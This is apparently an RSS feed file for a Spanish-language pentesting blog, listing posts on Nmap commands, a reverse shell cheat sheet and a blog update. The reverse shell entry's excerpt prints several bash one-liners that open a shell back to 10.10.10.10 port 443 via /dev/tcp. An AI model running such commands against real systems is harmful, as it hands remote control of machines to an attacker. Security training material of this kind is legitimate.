@@ -1,0 +1,164 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>Posts on Taurus Omar</title>
+    <link>https://taurusomar.github.io/posts/</link>
+    <description>Recent content in Posts on Taurus Omar</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>whoami@taurusomar.com (Taurus Omar)</managingEditor>
+    <webMaster>whoami@taurusomar.com (Taurus Omar)</webMaster>
+    <copyright>©2021, All Rights Reserved</copyright>
+    <lastBuildDate>Thu, 21 Oct 2021 01:00:31 -0500</lastBuildDate>
+    
+        <atom:link href="https://taurusomar.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Nmap Lista de Comandos</title>
+        <link>https://taurusomar.github.io/posts/nmap-cheat-sheet/</link>
+        <pubDate>Thu, 21 Oct 2021 01:00:31 -0500</pubDate>
+        <author>whoami@taurusomar.com (Taurus Omar)</author>
+        <atom:modified>Thu, 21 Oct 2021 01:00:31 -0500</atom:modified>
+        <guid>https://taurusomar.github.io/posts/nmap-cheat-sheet/</guid>
+        <description>Contexto Nmap (Network Mapper) simplemente es un escáner de red basado en (software libre) y de código abierto, el cual se utiliza durante una de las fases de Pentesting puntualmente en la fase de reconocimiento, el cual permite al Tester descubrir hosts y servicios de una red, enviando paquetes para posteriormente analizar sus respuestas.
+Veremos unos cuantos comandos de Nmap, pasando de basicos pasivos a los que se usan comunmente durante un reconocimiento pasaras de ( Bot to Hero).</description>
+        
+        <dc:creator>Taurus Omar</dc:creator>
+        <media:content url="https://taurusomar.github.io/https://i.imgur.com/f9UPbYQ.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>Nmap</category>
+            
+          
+            
+              <category>Escaneo Port</category>
+            
+          
+            
+              <category>Escaneo Port</category>
+            
+          
+            
+              <category>Reconnaissance</category>
+            
+          
+        
+        
+          
+            
+              <category>Nmap</category>
+            
+          
+            
+              <category>Reconnaissance</category>
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Reverse Shell Cheat Sheet</title>
+        <link>https://taurusomar.github.io/posts/reverse-shell/</link>
+        <pubDate>Thu, 14 Oct 2021 01:02:31 -0500</pubDate>
+        <author>whoami@taurusomar.com (Taurus Omar)</author>
+        <atom:modified>Thu, 14 Oct 2021 01:02:31 -0500</atom:modified>
+        <guid>https://taurusomar.github.io/posts/reverse-shell/</guid>
+        <description>En este post estan posiblemente las mejores formas de obtener una reverse shell segun mi experiencia, y algunas de ellas son experimentos mios que estan funcionado, de la misma manera me pase recolectando unas cuentas formas mas para poder obtener una conexión reversa posiblemente sea la mejor lista practica de como entablar una reverse shell.
+Bash bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1 bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1&amp;quot; 0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/10.10.10.10/443; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196 bash -l &amp;gt; /dev/tcp/10.</description>
+        
+        <dc:creator>Taurus Omar</dc:creator>
+        <media:content url="https://taurusomar.github.io/https://i.imgur.com/5ka8TiS.jpg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>Netcat</category>
+            
+          
+            
+              <category>Python</category>
+            
+          
+            
+              <category>Bash</category>
+            
+          
+            
+              <category>Php</category>
+            
+          
+        
+        
+          
+            
+              <category>Reverse Shell</category>
+            
+          
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Actualización</title>
+        <link>https://taurusomar.github.io/posts/update-blog/</link>
+        <pubDate>Fri, 20 Aug 2021 01:02:31 -0500</pubDate>
+        <author>whoami@taurusomar.com (Taurus Omar)</author>
+        <atom:modified>Fri, 20 Aug 2021 01:02:31 -0500</atom:modified>
+        <guid>https://taurusomar.github.io/posts/update-blog/</guid>
+        <description>Bueno he tenido este espacio super abandonado, por temas varios incluyendo el trabajo aunque estoy tratando de retomar el hilo de muchas cosas relacionadas con mi espacio dentro del internet, planetado varias cosistas nuevas:
+1.) Mas contenido en el blog (basico/avanzado)
+2.) Un canal de Youtube
+3.) Un espacio dentro del blog para detallar herramientas en español
+4.) Profundizar mas sobre el REDTEAM
+5.) Contenido sobre Linux
+Todas las publicaciones del anterior blog sera elimindas, en fin espero tratar de cumplir con todo.</description>
+        
+        <dc:creator>Taurus Omar</dc:creator>
+        <media:content url="https://taurusomar.github.io/https://i.imgur.com/h6BM98D.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>Blog</category>
+            
+          
+        
+        
+          
+            
+          
+        
+        
+          
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
